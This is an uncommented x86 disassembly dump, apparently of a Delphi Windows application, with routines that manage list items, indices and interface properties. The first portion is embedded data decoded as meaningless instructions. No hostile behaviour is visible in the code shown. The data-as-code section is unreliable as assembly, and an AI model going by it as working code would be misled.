add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
or [ ecx + ecx * 2 ] eax
dec ecx
outsb
cmp [ eax ] eax
pop eax
inc eax
je r-xdata
add [ esi + esi + 0x40 ] dh
add [ eax + esi * 2 ] cl
add [ eax + 0x36 ] bl
inc eax
outsd
and cl bl
inc esp
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060010 ] al
arpl [ ebp + 0x64 ] si
add [ fs : eax ] al
je r-xdata
add [ eax ] al
dec eax
in al 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
add [ eax ] al
add [ eax ] bl
aam 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
je r-xdata
add [ eax ] dl
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
pop es
inc ebx
popad
jo r-xdata
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
jae r-xdata
outsd
outsb
je r-xdata
jmp [ eax - 0x1d ]
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
sbb ah dl
inc esi
add [ edi + ecx * 8 ] ch
inc esi
add [ edx ] dl
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
add [ esi + esi + 0x40 ] dh
add al ch
push 0x1c0041e2
cmp [ eax ] eax
adc [ ecx ] bh
inc eax
insd
jae r-xdata
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060008 ] al
insd
popad
add eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
call 0x7447165a
add [ eax ] al
dec [ eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] cl
dec eax
insb
jo r-xdata
imul ebp [ edi + 0x6e ] r-xdata
push 0x0
add bh bh
enter 0x44e4 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
lodsb [ gs : esi ]
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
adc [ eax ] al
enter 0x0 0xff
or al 0xde
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
js r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
fadd [ esi ]
add [ eax ] eax
add [ eax ] al
adc [ eax ] al
mov al [ 0xffffffffa0ff0000 ]
add [ eax ] al
mov eax 0x80046cc
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 8 + 0x2c0046 ] cl
inc eax
add [ ebx + edx * 8 + 0x10070046 ] ah
push esp
push ebx
je r-xdata
insd
inc ebx
jne r-xdata
add [ eax ] al
inc [ eax ]
out 0x44 al
rol [ esi ] cl
rol [ eax ] 0x1
add bh bh
mov ah 0xe2
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4905000a ] al
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
add eax 0x6d657449
lodsb [ esi ]
adc [ eax ] al
jl r-xdata
add [ eax + 0x36 ] bl
inc eax
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 8 + 0x280046 ] dh
add [ eax ] al
aam 0xd8
inc ebx
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax ] al
0x42600041 0x44
insd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
and cl bl
inc esp
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
inc esi
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000f ] al
outsb
dec ecx
je r-xdata
into
clc
fadd [ eax + eax + 0x3c ]
call 0xffffffffe8aad63d
inc esp
add [ eax + 0x44e8 ] bl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5312000c ] al
arpl [ gs : edi + 0x6e ] bp
add [ ecx ] 0x0
add [ eax ] al
or eax 0x69560700
jae r-xdata
jae r-xdata
insd
popad
jb r-xdata
adc dl [ ebx + 0x65 ]
arpl [ edi + 0x6e ] bp
xor al 0x41
add [ eax + eax - 0x19430100 ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
movsb [ edi ] [ esi ]
add [ eax ] al
jmp [ eax + 0x10046dd ]
add bh bh
add dh ah
inc esp
loope r-xdata
arpl [ ecx + ebp * 2 + 0x73 ] cx
mov eax 0x4c0041e9
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060010 ] al
fld [ eax + eax - 0x78 ]
add [ eax ] al
dec [ eax + 0x1ff0000 ]
push ebx
push 0x4374726f
jne r-xdata
outsb
add [ esi ] al
bound ebp [ ebp - 0x44 ]
rol [ esi ] cl
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ ecx ] cl
dec edi
outsb
inc edi
je r-xdata
0xeac00041 0x41
dec esp
nop
sbb al 0xd7
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
push es
jae r-xdata
dec eax
imul ebp [ esi + 0x74 ] r-xdata
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
je r-xdata
adc [ eax ] al
xchg [ eax ] al
add bh bh
and bh ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi + 0x6e ] cl
push ebp
jo r-xdata
and al 0xce
insd
sub_46d85c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_416ddc
mov [ esi + 0x18 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_46d898
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_4046e4
test eax eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_416e80
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_404480
pop esi
pop ebx
retn
sub_46d8f8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_46da90
push eax
mov edx esi
mov eax ebx
call sub_46da90
mov edx eax
mov eax ebx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x28 ]
pop edi
pop esi
pop ebx
retn
sub_46d934
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1d ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4171e4
dec eax
jle r-xdata
push esi
mov eax ebx
call sub_4171e4
mov ecx eax
dec ecx
xor edx edx
mov eax ebx
call sub_46d9fc
sub_46d964
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
pop ebx
retn
mov eax [ ecx + 0x10 ]
mov edx [ edx + 0x10 ]
xchg edx eax
call sub_408800
mov eax [ ecx + 0x10 ]
mov edx [ edx + 0x10 ]
xchg edx eax
call sub_4087c8
jmp r-xdata
pop ebx
retn
sub_46d9a0
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_46da90
mov ebp eax
mov edx edi
mov eax ebx
call sub_46da90
mov [ esp ] eax
mov edx esi
mov eax ebx
call sub_46da90
call sub_416e68
mov esi eax
mov edx edi
mov eax ebx
call sub_46da90
call sub_416e68
mov edx eax
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov edx esi
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46d9fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46d9a0
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46d9fc
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46dac8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44e210
mov [ esi + 0xc8 ] 0xffffffff
mov [ esi + 0x60 ] 0x0
mov dl 0x1
mov eax esi
call sub_44e4c8
mov dl 0x1
mov eax esi
call sub_46dca0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_46db20
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa8 ] 0x1
xor eax eax
push ebp
push sub_46dc22
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa8 ] 0x0
retn
mov eax edi
mov edx [ r-xdata ]
call sub_403870
mov ecx eax
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_4161a0
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_4161a0
cmp edi [ eax + 0x20 ]
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403870
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_4161a0
pop edx
mov ecx [ eax ]
call [ ecx + 0x8c ]
sub_46dc30
push ebx
push ecx
mov [ esp ] 0xffffffff
cmp [ eax + 0xba ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_46dc6c
push ebx
mov ebx eax
mov eax ebx
call sub_41e5f4
mov al [ ebx + 0xa1 ]
test al al
je r-xdata
mov eax [ ebx + 0xac ]
test eax eax
je r-xdata
mov edx eax
mov eax ebx
call sub_46dca0
pop ebx
retn
mov edx eax
mov eax ebx
call sub_46dda0
sub_46dca0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0xa0 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0xa0 ] dl
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0xa1 ] dl
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
cmp eax 0xffffffff
je r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_46de0c
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xb0 ] 0x1
xor eax eax
push ebp
push sub_46dd6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ ebp - 0xc ]
call sub_4161a0
mov dl [ ebp - 0x5 ]
mov ecx [ eax ]
call [ ecx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xb0 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ ebp - 0xc ]
call sub_4161a0
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
sub_46dda0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
test ebp ebp
je r-xdata
cmp ebp [ ebx + 0xa4 ]
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0xa4 ] ebp
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebx + 0xac ] ebp
jmp r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4161a0
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x88 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4161a0
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
sub_46de0c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebx + 0xc8 ] ebp
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4161a0
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4161a0
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
sub_46de6c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
mov edx [ eax ]
call [ edx + 0x54 ]
test eax eax
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
cmp [ esi + 0xd2 ] 0x0
setne bl
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ esi + 0xd4 ]
call [ esi + 0xd0 ]
sub_46debc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] cl
mov [ esp ] edx
mov esi eax
mov al [ esp + 0x4 ]
sub al 0x1
jb r-xdata
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
dec al
je r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ eax + 0x50 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
cmp [ eax + 0xa0 ] 0x0
je r-xdata
inc ebx
xor edi edi
mov eax [ eax + 0x50 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp + 0x20 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ ebp + 0x20 ]
mov edx [ r-xdata ]
call sub_403870
mov eax [ eax + 0x284 ]
call sub_483c24
mov [ esp + 0x8 ] eax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ esp ]
mov edx [ eax + 0x18 ]
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_47db78
mov [ esp + 0xc ] eax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
mov eax [ esp + 0xc ]
call sub_47d618
mov eax [ esp ]
mov ecx [ eax + 0x18 ]
xor edx edx
mov eax [ esp + 0xc ]
call sub_47d7d0
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov eax [ esp + 0xc ]
call sub_47d6c8
mov eax [ ebp + 0x20 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ esp ]
call sub_416e68
mov edx eax
mov eax [ ebp + 0x20 ]
mov eax [ eax + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
mov eax [ esi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_4161a0
mov ebp eax
mov eax [ ebp + 0x20 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ esp ]
call sub_416e68
mov edx eax
mov eax [ ebp + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_47e4d0
mov eax [ esi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_4161a0
mov ebp eax
mov eax [ ebp + 0x20 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
sub_46e06c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_4174c0
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
cmp [ eax + 0xa0 ] 0x0
je r-xdata
cmp [ eax + 0xb0 ] 0x0
jne r-xdata
mov eax [ eax + 0x50 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
inc ebp
mov [ esp ] 0x0
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_403870
mov esi eax
mov eax ebx
call sub_416e68
mov edx eax
mov eax [ esi + 0x284 ]
call sub_46da90
mov esi eax
mov edx [ ebx + 0x10 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ ebx + 0x18 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ ebx + 0x14 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
inc [ esp ]
dec ebp
jne r-xdata
mov eax ebx
call sub_416e68
mov edx eax
mov eax [ esi + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_47dc04
mov esi eax
mov edx [ ebx + 0x10 ]
mov eax esi
call sub_47d618
mov ecx [ ebx + 0x18 ]
xor edx edx
mov eax esi
call sub_47d7d0
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_47d6c8
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx [ esp ]
call sub_4161a0
mov esi eax
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
sub_46e188
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_46dac8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x60 ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41752c
mov esi eax
mov [ ebx + 0xd0 ] esi
mov [ esi + 0x28 ] ebx
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_46e1e8
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
lea eax [ esi + 0xd0 ]
call sub_40dabc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44e264
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_46e224
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov esi edx
mov edi eax
test esi esi
jl r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ edi + 0xd0 ]
call sub_4171e4
cmp esi eax
jl r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax [ edi + 0xd0 ]
call sub_46da90
mov edx eax
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ edi + 0xda ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx edi
mov eax [ edi + 0xdc ]
call [ edi + 0xd8 ]
sub_46e290
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xd0 ]
call sub_46da90
mov edx [ eax + 0x10 ]
mov eax edi
call sub_404480
pop edi
pop esi
pop ebx
retn
sub_46e2c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xd0 ]
call sub_46da90
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop edi
pop esi
pop ebx
retn
sub_46e2fc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_46e328
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41ea88
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
cmp [ esi + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_46e3dc
sub_46e36c
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov ebx [ esi + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax esi
call sub_46e3dc
mov eax [ esi + 0x10 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
sub_46e3dc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46e51f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e526
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov ebx [ esi + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov ebx [ esi + 0x10 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403870
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x54 ]
dec eax
test eax eax
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc eax
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc ebx
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0xd0 ]
mov edx ebx
call sub_46da90
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x90 ]
inc ebx
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x94 ]
mov eax [ edi + 0xd0 ]
mov edx ebx
call sub_46da90
mov ecx eax
mov edx ebx
mov eax edi
call sub_46e224
test al al
je r-xdata
jmp r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_46de6c
test al al
je r-xdata
sub_46e534
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46e553
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e55a
retn
sub_46e560
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403870
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_46e598
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46e5bd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e5c4
retn
sub_46e5d0
aam 0xe5
inc esi
add [ ebx ] al
adc edx [ eax + ecx * 2 + 0x65 ]
popad
